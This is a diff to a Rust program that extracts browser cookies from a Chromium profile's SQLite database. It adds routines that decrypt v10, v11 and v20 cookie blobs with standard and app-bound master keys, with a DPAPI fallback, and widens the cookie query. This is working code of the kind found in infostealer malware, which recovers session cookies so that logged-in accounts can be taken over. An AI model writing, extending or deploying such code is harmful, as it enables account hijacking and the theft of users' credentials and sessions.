@@ -116,6 +116,69 @@ fn aes_gcm_decrypt(data: &[u8], key: &[u8]) -> Option<Vec<u8>> {
     cipher.decrypt(nonce, ciphertext).ok()
 }
 
+fn cookie_plaintext(pt: &[u8], is_v20: bool) -> String {
+    let data = if is_v20 && pt.len() > 32 { &pt[32..] } else { pt };
+    String::from_utf8_lossy(data).into_owned()
+}
+
+fn decrypt_cookie_blob(blob: &[u8], keys: &MasterKeys) -> Option<String> {
+    if blob.len() < 3 {
+        return None;
+    }
+
+    if blob.starts_with(b"v20") {
+        if let Some(ref ab_key) = keys.app_bound {
+            if let Some(pt) = aes_gcm_decrypt(blob, ab_key) {
+                return Some(cookie_plaintext(&pt, true));
+            }
+        }
+        if let Some(pt) = aes_gcm_decrypt(blob, &keys.standard) {
+            return Some(cookie_plaintext(&pt, true));
+        }
+        return None;
+    }
+
+    if blob.starts_with(b"v10") || blob.starts_with(b"v11") {
+        if let Some(pt) = aes_gcm_decrypt(blob, &keys.standard) {
+            return Some(cookie_plaintext(&pt, false));
+        }
+        if let Some(ref ab_key) = keys.app_bound {
+            if let Some(pt) = aes_gcm_decrypt(blob, ab_key) {
+                return Some(cookie_plaintext(&pt, false));
+            }
+        }
+        return None;
+    }
+
+    None
+}
+
+fn decrypt_cookie_value(encrypted: &[u8], plain_value: &str, keys: &MasterKeys) -> String {
+    if encrypted.is_empty() {
+        return plain_value.to_string();
+    }
+
+    for skip in [0usize, 32] {
+        if encrypted.len() > skip + 3 {
+            if let Some(value) = decrypt_cookie_blob(&encrypted[skip..], keys) {
+                if !value.is_empty() {
+                    return value;
+                }
+            }
+        }
+    }
+
+    if let Some(dec) = dpapi_decrypt(encrypted, None, 0) {
+        return cookie_plaintext(&dec, false);
+    }
+
+    if !plain_value.is_empty() {
+        return plain_value.to_string();
+    }
+
+    String::new()
+}
+
 fn decrypt_value(encrypted: &[u8], keys: &MasterKeys) -> Option<String> {
     if encrypted.is_empty() { return Some(String::new()); }
     if encrypted.len() > 3 && encrypted.starts_with(b"v20") {
@@ -206,29 +269,26 @@ fn extract_cookies(profile_path: &Path, keys: &MasterKeys) -> Option<String> {
     };
     let temp = copy_db(&db_path)?;
     let conn = Connection::open(&temp).ok()?;
-    let mut stmt = conn.prepare("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies").ok()?;
+    let mut stmt = conn.prepare("SELECT host_key, name, encrypted_value, value, path, expires_utc, is_secure, is_httponly FROM cookies").ok()?;
     let rows = stmt.query_map([], |row| {
         let host: String = row.get(0)?;
         let name: String = row.get(1)?;
         let enc_value: Vec<u8> = row.get(2)?;
-        let path: String = row.get(3)?;
-        let expires: i64 = row.get(4)?;
-        let is_secure: i64 = row.get(5)?;
-        let is_httponly: i64 = row.get(6)?;
-        Ok((host, name, enc_value, path, expires, is_secure, is_httponly))
+        let plain_value: String = row.get(3)?;
+        let path: String = row.get(4)?;
+        let expires: i64 = row.get(5)?;
+        let is_secure: i64 = row.get(6)?;
+        let is_httponly: i64 = row.get(7)?;
+        Ok((host, name, enc_value, plain_value, path, expires, is_secure, is_httponly))
     }).ok()?;
     let mut count = 0;
     let mut body = String::new();
     for row in rows.flatten() {
-        let (host, name, enc_value, path, expires, is_secure, is_httponly) = row;
+        let (host, name, enc_value, plain_value, path, expires, is_secure, is_httponly) = row;
         if name.is_empty() {
             continue;
         }
-        let value = if enc_value.is_empty() {
-            String::new()
-        } else {
-            decrypt_value(&enc_value, keys).unwrap_or_default()
-        };
+        let value = decrypt_cookie_value(&enc_value, &plain_value, keys);
         let unix_expires = if expires > 0 {
             (expires / 1_000_000) - 11644473600
         } else {
